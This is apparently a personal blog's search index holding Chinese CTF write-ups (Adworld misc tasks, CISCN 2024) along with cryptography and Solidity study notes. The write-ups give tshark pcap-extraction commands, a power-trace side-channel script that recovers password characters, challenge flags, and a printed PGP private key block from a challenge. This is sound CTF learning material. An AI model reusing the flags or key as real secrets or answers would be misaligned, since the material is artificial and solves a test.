<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>攻防世界</title>
      <link href="/2024/05/31/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"/>
      <url>/2024/05/31/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/</url>
      
        <content type="html"><![CDATA[<h3 id="pdf"><a href="#pdf" class="headerlink" title="pdf"></a>pdf</h3><p>移开图片，即可得到flag</p><h3 id="base64stego"><a href="#base64stego" class="headerlink" title="base64stego"></a>base64stego</h3><p>伪加密，然后base64隐写</p><h3 id="流量分析2"><a href="#流量分析2" class="headerlink" title="流量分析2"></a>流量分析2</h3><p>发现text.txt文件，导出http</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> os<br><br>data = os.listdir()<br><br>s=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (<span class="hljs-number">1</span>,<span class="hljs-number">11</span>):<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">f&#x27;test(<span class="hljs-subst">&#123;i&#125;</span>).txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>)<span class="hljs-keyword">as</span> f:<br>        de = f.read().strip()<br>        s+=de<br><span class="hljs-built_in">print</span>(s)<span class="hljs-comment"># &#123;17uaji1l&#125;</span><br></code></pre></td></tr></table></figure><h3 id="神奇的Modbus"><a href="#神奇的Modbus" class="headerlink" title="神奇的Modbus"></a>神奇的Modbus</h3><p>搜索modbus，然后追踪tcp流即可。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>计算机组成原理</title>
      <link href="/2024/05/29/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/"/>
      <url>/2024/05/29/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>现代密码学</title>
      <link href="/2024/05/29/%E7%8E%B0%E4%BB%A3%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
      <url>/2024/05/29/%E7%8E%B0%E4%BB%A3%E5%AF%86%E7%A0%81%E5%AD%A6/</url>
      
        <content type="html"><![CDATA[<h3 id="第一章-概述"><a href="#第一章-概述" class="headerlink" title="第一章 概述"></a>第一章 概述</h3><h4 id="信息安全三要素"><a href="#信息安全三要素" class="headerlink" title="信息安全三要素"></a>信息安全三要素</h4><p>保密性： 使截获者在不知密钥条件下不能解读信息。<br>完整性：保证信息从真实的发送者传送到真实的接收者手中，传送过程中没有非法用户添加删除和替换<br>可用性：指保障信息资源随时可提供服务的能力特性&#x2F;保证经过授权的客户能及时准确地不间断的访问数据。<br>认证性：使任何不知密钥的人不能构造一个密钥，使意定的接收者脱密成一个可理解的消息。<br>Kerckhoff 原则： 系统的保密性不依赖与对加密提示或算法的保密，而依赖于密钥。</p><h4 id="密钥体制分类"><a href="#密钥体制分类" class="headerlink" title="密钥体制分类"></a>密钥体制分类</h4><p>单钥体制：加密和解密密钥相同，主要问题是密钥产生和密钥管理包括流密码和分组密码。<br>双钥体制：加密和解密密钥不同，安全性可实现对A所发消息的验证<br><img src="/2024/05/29/%E7%8E%B0%E4%BB%A3%E5%AF%86%E7%A0%81%E5%AD%A6/image.png" alt="alt text"></p><h3 id="第二章-流密码"><a href="#第二章-流密码" class="headerlink" title="第二章 流密码"></a>第二章 流密码</h3><h4 id="基本概念和分类"><a href="#基本概念和分类" class="headerlink" title="基本概念和分类"></a>基本概念和分类</h4><p>流密码是将明文划分为字符，或其编码的基本单元，每一字符分别与密钥流对应字符“作用”，从而进行加密，解密时以同步产生的同样的密钥流实现。<br>流密码强度完全依赖于密钥流生成器生成的密钥流的随机性和不可预测性<br>流密码有记忆性，分组密码则没有。</p><ol><li>同步流密码：密钥流产生算吗和明文（密文）无关</li><li>自同步流密码：密钥流产生算法与明文（密文）有关</li></ol><h4 id="n级反馈移位寄存器"><a href="#n级反馈移位寄存器" class="headerlink" title="n级反馈移位寄存器"></a>n级反馈移位寄存器</h4><p>GF（2）上一个n级反馈移位寄存器有n个二元存储器与一个反馈函数f（a1，a2，…，an）组成<br><img src="/2024/05/29/%E7%8E%B0%E4%BB%A3%E5%AF%86%E7%A0%81%E5%AD%A6/1.png" alt="alt text"></p><h4 id="线性反馈移位寄存器（LFSR）"><a href="#线性反馈移位寄存器（LFSR）" class="headerlink" title="线性反馈移位寄存器（LFSR）"></a>线性反馈移位寄存器（LFSR）</h4><p>GF(2)上的n级线性反馈移位寄存器，f(a1,a2,…,an)&#x3D; cna1⊕cn−1a2⊕L⊕c1an<br><img src="/2024/05/29/%E7%8E%B0%E4%BB%A3%E5%AF%86%E7%A0%81%E5%AD%A6/1857677-20231118214500630-306761.png" alt="alt text"></p><p>n级LFSR状态数：最多有2^n个<br>n级LFSR的状态周期：&lt;&#x3D;2^n-1。输出序列的周期&#x3D;状态周期。<br>周期达到最大值的序列称为m序列<br>LFSR的特征多项式：p(x)&#x3D;1+c1x+…＋cn-1xn-1＋cnxn<br><img src="/2024/05/29/%E7%8E%B0%E4%BB%A3%E5%AF%86%E7%A0%81%E5%AD%A6/1857677-20231118214605564-2039452965.png" alt="alt text"></p><h4 id="m序列"><a href="#m序列" class="headerlink" title="m序列"></a>m序列</h4><p>伪随机序列：密钥流不可能做到最忌，只能要求截获比周期短的一段序列时不会泄露更多的信息<br>游程：连续的0或1的个数</p><p><img src="/2024/05/29/%E7%8E%B0%E4%BB%A3%E5%AF%86%E7%A0%81%E5%AD%A6/05/29/%E7%8E%B0%E4%BB%A3%E5%AF%86%E7%A0%81%E5%AD%A6/31142730_61cea2d2cf86778468.png" alt="alt text"></p><p>三个有关伪随机序列的随机性公设：</p><p>1.在一个周期内，0和1的个数相差最多为1<br>2.在序列某个周期内，长为1的游程占游程数的1&#x2F;2，长为2<br>的游程占游程总数的1&#x2F;2^2，长为i的游程占游程总数的1&#x2F;2^i,且0和1的游程数相等.<br>3.异相自相关函数为一个常数。<br>m序列满足如上的三个随机性公设。</p><p>对于m序列，游程总数为2^(n-1)。</p><p>GF(2)上周期为 T 的序列{ai }的自相关函数</p><p>设序列{ai}满足线性递推关系：<br><img src="/2024/05/29/%E7%8E%B0%E4%BB%A3%E5%AF%86%E7%A0%81%E5%AD%A6/1857677-20231118214635730-685149095.png" alt="alt text"></p><h4 id="m序列的破译"><a href="#m序列的破译" class="headerlink" title="m序列的破译"></a>m序列的破译</h4><p><img src="/2024/05/29/%E7%8E%B0%E4%BB%A3%E5%AF%86%E7%A0%81%E5%AD%A6/1857677-20231118214700145-2135394747.png" alt="alt text"><br><img src="/2024/05/29/%E7%8E%B0%E4%BB%A3%E5%AF%86%E7%A0%81%E5%AD%A6/1857677-20231118214705101-1255327708%20(1).png" alt="alt text"><br><img src="/2024/05/29/%E7%8E%B0%E4%BB%A3%E5%AF%86%E7%A0%81%E5%AD%A6/1857677-20231118214710632-333283940.png" alt="alt text"></p><h3 id="分组密码体制"><a href="#分组密码体制" class="headerlink" title="分组密码体制"></a>分组密码体制</h3><h3 id><a href="#" class="headerlink" title></a></h3>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>solidity</title>
      <link href="/2024/05/28/solidity/"/>
      <url>/2024/05/28/solidity/</url>
      
        <content type="html"><![CDATA[<h3 id="错误处理及异常：Assert-Require-Revert"><a href="#错误处理及异常：Assert-Require-Revert" class="headerlink" title="错误处理及异常：Assert, Require, Revert"></a>错误处理及异常：Assert, Require, Revert</h3><h4 id="用-assert-检查异常-Panic-和-require-检查错误-Error"><a href="#用-assert-检查异常-Panic-和-require-检查错误-Error" class="headerlink" title="用 assert 检查异常(Panic) 和 require 检查错误(Error)"></a>用 assert 检查异常(Panic) 和 require 检查错误(Error)</h4><p>assert和require可用于检查条件并抛出异常<br>assert函数会创建一个Painc（uint256）的错误，只用于测试内部错误，检查不变量。<br>下列情况将会产生一个Panic异常： 错误数据会提供的错误码编号，用来指示Panic的类型：</p><p>0x00: 用于常规编译器插入的Panic。<br>0x01: 如果你调用 assert 的参数（表达式）结果为 false 。<br>0x11: 在 unchecked { … } 外，如果算术运算结果向上或向下溢出。<br>0x12; 如果你用零当除数做除法或模运算（例如 5 &#x2F; 0 或 23 % 0 ）。<br>0x21: 如果你将一个太大的数或负数值转换为一个枚举类型。<br>0x22: 如果你访问一个没有正确编码的存储byte数组.<br>0x31: 如果在空数组上 .pop() 。<br>0x32: 如果你访问 bytesN 数组（或切片）的索引太大或为负数。(例如： x[i] 而 i &gt;&#x3D; x.length 或 i &lt; 0).<br>0x41: 如果你分配了太多的内内存或创建了太大的数组。<br>0x51: 如果你调用了零初始化内部函数类型变量。</p><p>assert当参数是false时会抛出panic异常，立即停止执行剩余代码，回滚当前交易所有状态变更(即任何更改不会保存在链上)，交易失败所消耗的gas不会返还。</p><p>require函数可以创建无错误提示的错误，也可创建一个 Error(string) 类型的错误。<br>下列情况将会产生一个 Error(string) （或无错误提示）的错误：</p><p>如果你调用 require(x) ，而 x 结果为 false 。<br>如果你使用 revert() 或者 revert(“description”) 。<br>如果你在不包含代码的合约上执行外部函数调用。<br>如果你通过合约接收以太币，而又没有 payable 修饰符的公有函数（包括构造函数和 fallback 函数）。<br>如果你的合约通过公有 getter 函数接收 Ether 。</p><h4 id="revert"><a href="#revert" class="headerlink" title="revert"></a>revert</h4><p>可以使用revert语句和函数来直接触发回退。<br>revert 语句将一个自定义的错误作为直接参数，没有括号：</p><p>revert CustomError(arg1, arg2);<br>由于向后兼容，还有一个 revert() 函数，它使用圆括号接受一个字符串：</p><p>revert(); revert(“description”);</p><h3 id="合约"><a href="#合约" class="headerlink" title="合约"></a>合约</h3><h4 id="函数修改器"><a href="#函数修改器" class="headerlink" title="函数修改器"></a>函数修改器</h4><p>它们可以在执行函数之前自动检查某个条件。 修改器modifier 是合约的可继承属性，并可能被派生合约覆盖 , 但前提是它们被标记为 virtual.。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// 建立了一个NoteBook的合约，只有NoteBook的拥有者才可以修改其内容record<br>contract NoteBook&#123;<br><br>    string public record; // NoteBook的内容<br>    address owner;// NoteBook的拥有者<br>    <br>    constructor() &#123;<br>        owner = msg.sender;<br>    &#125;<br>    <br>    // 修改record的内容<br>    function changeRecord(string memory _record) public isOwner &#123;<br>        record = _record;<br>    &#125;<br>    <br>    // 函数修改器：判断是否是NoteBook的<br>    modifier isOwner&#123;<br>        require(msg.sender == owner, &quot;You are not the owner of this NoteBook&quot;);<br>        _;<br>    &#125;<br>    <br>&#125;<br><br></code></pre></td></tr></table></figure><p>上述例子中，我们通过关键字 modifier 后面接函数修改器名 NoteBook 来定义一个modifier。在上述定义的modifier中如果调用者不是拥有者则会停止执行接下来的代码，并在控制台输出自定义的原因。如果是的话则执行到 _ 处，_ 代表使用该modifier的函数体，这里即为changeRecord 函数的函数体。在执行changeRecord 函数前先会使用isOwner进行检查，没有问题后才会执行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract modifierOder &#123;<br>    address owner;<br>    uint256 a;<br>    <br>    constructor() &#123;<br>        owner = msg.sender;<br>    &#125;<br>    <br>    function test(uint num) public checkPara(num) returns(uint256) &#123;<br>        a = 10;<br>        return a;<br>    &#125;<br>    <br>    // 修改a <br>    modifier checkPara(uint number) &#123;<br>        a = 1;<br>        _;<br>        a = 100;<br>    &#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><p>如以上代码所示：在 _后又有一句代码a &#x3D; 100 。函数执行完return后，后面的代码则不再执行，但是在modifier中，执行完函数体 _ 还会接着执行 a &#x3D; 100 这条语句。所以尽管函数返回的a 的值为10，但是最后a的值变成了100。</p><h4 id="Constant-和-Immutable-状态变量"><a href="#Constant-和-Immutable-状态变量" class="headerlink" title="Constant 和 Immutable 状态变量"></a>Constant 和 Immutable 状态变量</h4><p>对于 constant 常量, 他的值在编译器确定，而对于 immutable(不可变量), 它的值在部署时确定。<br>对于constant状态量，只能使用那些在编译时有确定值的表达式 ，任何通过访问 storage，区块链数据（例如 block.timestamp, address(this).balance 或者 block.number）或执行数据（ msg.value 或 gasleft() ） 或对外部合约的调用来给它们赋值都是不允许的。<br>内建（built-in）函数 keccak256 ， sha256 ， ripemd160 ， ecrecover ， addmod 和 mulmod 是允许的（即使他们确实会调用外部合约， keccak256 除外）。<br>对于immutable，可以在合约的构造函数中或声明时为不可变的变量分配任意值。 不可变量只能赋值一次，并且在赋值之后才可以读取。</p><h4 id="状态可变性"><a href="#状态可变性" class="headerlink" title="状态可变性"></a>状态可变性</h4><h5 id="view"><a href="#view" class="headerlink" title="view"></a>view</h5><p>要求保证不修改状态<br>下面的语句被认为是修改状态：</p><p>修改状态变量。<br>产生事件。<br>创建其它合约。<br>使用 selfdestruct。<br>通过调用发送以太币。<br>调用任何没有标记为 view 或者 pure 的函数。<br>使用低级调用。<br>使用包含特定操作码的内联汇编。</p><h5 id="pure"><a href="#pure" class="headerlink" title="pure"></a>pure</h5><p>函数可以声明为 pure ，在这种情况下，承诺不读取也不修改状态变量。</p><p>特别是，应该可以在编译时确定一个 pure 函数，它仅处理输入参数和 msg.data ，对当前区块链状态没有任何了解。 这也意味着读取 immutable 变量也不是一个 pure 操作。<br>除了上面解释的状态修改语句列表之外，以下被认为是读取状态：</p><p>读取状态变量。<br>访问 address(this).balance 或者 <address>.balance。<br>访问 block，tx， msg 中任意成员 （除 msg.sig 和 msg.data 之外）。<br>调用任何未标记为 pure 的函数。<br>使用包含某些操作码的内联汇编。</address></p><h4 id="Event"><a href="#Event" class="headerlink" title="Event"></a>Event</h4><p>在Solidity 代码中，使用event 关键字来定义一个事件，这个用法和定义函数式一样的，并且事件在合约中同样可以被继承。触发一个事件使用emit(说明，之前的版本里并不需要使用emit)，触发事件可以在任何函数中调用。</p><h4 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h4><p>父合约标记为 virtual 函数可以在继承合约里重写(overridden)以更改他们的行为。重写的函数需要使用关键字 override 修饰<br>重写函数只能将覆盖函数的可见性从 external 更改为 public 。<br>可变性可以按照以下顺序更改为更严格的一种： nonpayable 可以被 view 和 pure 覆盖。 view 可以被 pure 覆盖。 payable 是一个例外，不能更改为任何其他可变性<br>如果函数没有标记为 virtual ， 那么派生合约将不能更改函数的行为(即不能重写)<br>对于多重继承，如果有多个父合约有相同定义的函数， override 关键字后必须指定所有父合约名。<br>如果（重写的）函数继承自一个公共的父合约， override 是可以不用显示指定的<br>private 的函数是不可以标记为 virtual 的。<br>除接口之外（因为接口会自动作为 virtual ），没有实现的函数必须标记为 virtual<br>从 Solidity 0.8.8 开始, 在重写接口函数时不再要求 override 关键字，除非函数在多个父合约定义。<br>尽管 public 的状态变量可以重写外部函数，但是 public 的状态变量不能被重写。</p>]]></content>
      
      
      <categories>
          
          <category> Blockchain </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ciscn 2024</title>
      <link href="/2024/05/27/ciscn-2024/"/>
      <url>/2024/05/27/ciscn-2024/</url>
      
        <content type="html"><![CDATA[<h3 id="火锅链观光打卡"><a href="#火锅链观光打卡" class="headerlink" title="火锅链观光打卡"></a>火锅链观光打卡</h3><p>签到题</p><h3 id="Power-Trajectory-Diagram"><a href="#Power-Trajectory-Diagram" class="headerlink" title="Power Trajectory Diagram"></a>Power Trajectory Diagram</h3><p>下载得到attachment.npz文件，发现有四部分数据，通过查看 input 和 index 后可以知道<br>题目是一共爆破了13个字符，每个字符爆破了40次，然后每次爆破都会有一条 trace<br>写一个 python 脚本读取 trace 数据并画折线图，发现每条 trace 都会有一个最小值</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs py"><br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br>data = np.load(<span class="hljs-string">&#x27;attachment.npz&#x27;</span>)<br><br>trace = data[<span class="hljs-string">&#x27;trace&#x27;</span>]<br><span class="hljs-built_in">input</span> = data[<span class="hljs-string">&#x27;input&#x27;</span>]<br><br><span class="hljs-comment"># print(input) 十三组打印字符串，每组字符串个数是40个，一共5200个字符串</span><br><br>index = data[<span class="hljs-string">&#x27;index&#x27;</span>]<br><br><span class="hljs-comment"># print(index) 内容是1-12.</span><br><br><span class="hljs-comment"># print(trace) 520个数组，每个数组应该是功耗变化值，对应input的字符，其中每组变化最大的就是密码中的字符</span><br><br>num_groups = <span class="hljs-number">13</span> <br>group_size = <span class="hljs-number">40</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">12</span>):<br>    res = []<br>    table = <span class="hljs-built_in">input</span>[:<span class="hljs-number">40</span>]<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">40</span>):<br>        <span class="hljs-built_in">min</span> = np.argmin(trace[i*<span class="hljs-number">40</span>+j])<br>        res.append(<span class="hljs-built_in">min</span>)<br>        <span class="hljs-comment"># print(res) 提取res中最大值来确定爆破字符的index</span><br>    index = np.argmax(res)<br>    char = table[index]<br>    <span class="hljs-built_in">print</span>(char,end=<span class="hljs-string">&#x27;&#x27;</span>) <span class="hljs-comment">#_ciscn_2024_</span><br><br><br></code></pre></td></tr></table></figure><h3 id="神秘文件"><a href="#神秘文件" class="headerlink" title="神秘文件"></a>神秘文件</h3><p>太难找了<br>part3 运用了宏编辑<br>alt+f11打开宏编辑页面</p><p>然后 base64 的RC4 解码 然后base64<br><img src="/../images/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-05-28%20140652.png" alt="屏幕截图 2024-05-28 140652"></p><p><img src="/../images/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-05-28%20142156.png" alt="屏幕截图 2024-05-28 142156"></p><h3 id="通风机"><a href="#通风机" class="headerlink" title="通风机"></a>通风机</h3><p>STEP7 MicroWIN V4.0 SP9 软件打开然后在 symbol table 中发现 base64 编码后的 flag，CyberChef 解码即可得到 flag</p><h3 id="Tough-DNS"><a href="#Tough-DNS" class="headerlink" title="Tough_DNS"></a>Tough_DNS</h3><p>题目内容：DNS的世界充满了多变的字符，接下来我将直接给你答案：56 16 26 93 66 53 16 56 d2 03 26 93 56<br>题目给了一个DNS流量包，发现有的包中有二进制数据，导出</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs py">tshark -r <span class="hljs-number">1.</span>pcapng -T fields -e dns.qry.name | sed <span class="hljs-string">&#x27;/^\s*$/d&#x27;</span> | uniq &gt; <span class="hljs-number">1.</span>txt<br></code></pre></td></tr></table></figure><p>然后将其转为二维码</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><span class="hljs-comment"># 新建一个列表来保存奇数行</span><br>odd_lines = []<br><br><span class="hljs-comment"># 打开文件并读取行</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;1.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>    <span class="hljs-keyword">for</span> index, line <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(file):<br>        <span class="hljs-comment"># 如果行号是奇数（索引是偶数），则保留该行</span><br>        <span class="hljs-keyword">if</span> index % <span class="hljs-number">2</span> == <span class="hljs-number">1</span>:<br>            odd_lines.append(line.strip())<br><br><span class="hljs-comment"># 将处理后的奇数行合并为一个字符串</span><br>s = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> odd_lines:<br>    s +=line  <span class="hljs-comment"># 使用 += 运算符来拼接字符串</span><br><br><span class="hljs-comment"># 然后继续按照原逻辑处理字符串s</span><br>MAX = <span class="hljs-number">21</span><br>i = <span class="hljs-number">0</span><br>pic = Image.new(<span class="hljs-string">&quot;RGB&quot;</span>, (MAX, MAX))<br><br><span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, MAX):<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, MAX):<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(s) &gt; i:  <span class="hljs-comment"># 确保索引没有超出字符串s的长度</span><br>            <span class="hljs-keyword">if</span> s[i] == <span class="hljs-string">&#x27;1&#x27;</span>:<br>                pic.putpixel((x, y), (<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>))<br>            <span class="hljs-keyword">else</span>:<br>                pic.putpixel((x, y), (<span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>))<br>        i += <span class="hljs-number">1</span><br><br>pic.save(<span class="hljs-string">&#x27;fl.png&#x27;</span>)<br></code></pre></td></tr></table></figure><p>扫码得到<br>15f9792dba5c<br>明显不是flag，继续看流量包，发现txt解析记录将其提取出来</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs py">tshark.exe -r Tough_DNS.pcapng -T fields -e dns.txt -Y <span class="hljs-string">&quot;(dns.txt.length == 1) &amp;&amp; (dns.id == 0x4500)&quot;</span>|tr -d <span class="hljs-string">&quot;\n&quot;</span> &gt;&gt;<span class="hljs-number">2.</span>txt<br> <br>tshark.exe -r Tough_DNS.pcapng -T fields -e dns.txt -Y <span class="hljs-string">&quot;(dns.txt.length == 1) &amp;&amp; (dns.id == 0x6421)&quot;</span>|tr -d <span class="hljs-string">&quot;\n&quot;</span> &gt;&gt;<span class="hljs-number">3.</span>txt<br></code></pre></td></tr></table></figure><p>得到两个文件，2.条txt文件发现是一个zip，那么猜测二维码扫出来的是密码。</p><p><img src="/2024/05/27/ciscn-2024/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-05-28%20114652.png" alt="alt text"></p><p>得到secret.gpg</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs py">-----BEGIN PGP PRIVATE KEY BLOCK-----<br>Version: GnuPG v1<br><br>lQIGBGR0mdUBBACYjdQSFv/9VkDcH406ee9a01IpIYv2tJkTu4WuEzh3cb52B+vT<br>FRbgC3MMohKL41potPMTVM6U4cisg0gTPnQeIk37R5A47g03gPRJxO6SBrolsM7W<br>ibfPpqT2dyQnsW8xfU7gxoiPoDQ16OeJzzM8GFhMbkNccBOOETgo9yTTOwARAQAB<br>/gcDArSnU3JKy53PYEuZt6Ur4DafWuUXztAfuzKkNwJCwhE9xGFGSWlo4whjOhzy<br>JaUGRL2ToiihW1JPlkvW59/my2X5DuvblMnMDilMYVzQzHcg0C0rVRpD97FNeZJG<br>ZfQnzQomF1a4/kz5jc1IpmMAxKLjJjkptXcI6vf72Hb9Rs07lrOYmBE2dc8OC8Wj<br>P/2vsAhHUxywWAQEG4ATXklAvBdipERfCU4aHW2GMsvlV1ncnp0MBuXjQeqCWt7i<br>9RYgIkvptZWl2Y8AtK5NsXZ0kZvKv/4GxJUZ5tmRep3YEbBlK2EihqLxALiPvMd+<br>yUmYnht5SZB67ZwbnwBwAdKLTvV03Rm8ZoTeg+EzLBXH7kj0Pl4/pnXiKvDgCS/<span class="hljs-number">6</span><br>IwP4h0sIx1H/<span class="hljs-number">4</span>/8AkJ/ivrOxPhm+FZ15ct64x54Ae27Hy7zjHwkCu5MMQ1smbQ/e<br>WbArOtJHJ6hKWI/CuA+0EBEQNNBUetx0dub+vazAyaQB1h8VXw7Y9aq0HmN0ZmVy<br>IChub25lKSA8Y3RmZXJAZ21haWwuY29tPoi4BBMBAgAiBQJkdJnVAhsDBgsJCAcD<br>AgYVCAIJCgsEFgIDAQIeAQIXgAAKCRDNNPbFh+VSkJjJBACFSEjtR6BQg3MCkrpt<br>9vwW9Opb1BXBrUKUD5z4od2enZwOPw/fRaiC2npr+DiGQ4XyIQzwsyn6Gx62h1UQ<br>SgGk4MLy/9ffEIYJHJAgU+ouEu+OWsk+VUJND5dHimIxyePgjHm+7NTr6CgFnflN<br>Oe2PeqmsOEcRNDSk5LNQ/L9UQJ0CBgRkdJnVAQQA4my1wcQGuuJ6dKxg62QBFy7W<br>N/cJnnWm0W0l/3LWDfRZq/Lk1wMmp9hBj16yRoh9EBvgQCz1de2Rx6TjvvOVUw0j<br>LyumHVIzetbjnQbMHWA1xLXSarDu9u3ZT2zwXV/vo4VukIlDIEayOshVrmk9VOMf<br>bngf//aDmRwsgj6ZIQMAEQEAAf4HAwK0p1NySsudz2C4Whqn6GQ8PMIyoqV8Y94u<br>p9+Qq34FiOgquLqetKoNNaG2M5KJJB77W9Yzt8dM0A09wCpObA9mTCW0SI4N6MJF<br>OdvY6jpG844uHI6L2IKMFZQTdDwvfgMPpGjLHM7/ho3dpec9BKDihQDeCrWl3tfy<br>WAh68pHPXYyMmTu51iGfkNCEv+SEHlqq0PsLbGT9DxwDWGPzCzvjpY79Uv1cS5Iw<br>IwI6aaccUjsoobvdqD8HJY2B4JGj1XY2oHrZDPH/OwgPMwArbHtHqgd632BxN9Of<br>l0sNzas41LB731RUcP79M7wWQPIbhx61ubIZPtejqa/P5u0gRpFKyHo6tW9t/al5<br>OL9F2vFhl63Hm1Us6XScduWZM9pmd3tEwarHVsBt4z+BIgJJKDvKWs9dgw2aQhKp<br>rwNKErMUfhiVuw0uTJBS2F4JsPjKdF7hp3mk7wiVGloCy0+c4l0EL+U/9N1EGD7y<br>K2NKDZFB4i1srW2aiJ8EGAECAAkFAmR0mdUCGwwACgkQzTT2xYflUpBfEwP+I1x7<br>DspB3GnQAFvXVtkmpi1ASEMQtbCMgexx4+PuqbbUNKOFr83mBkzCQkuh5lr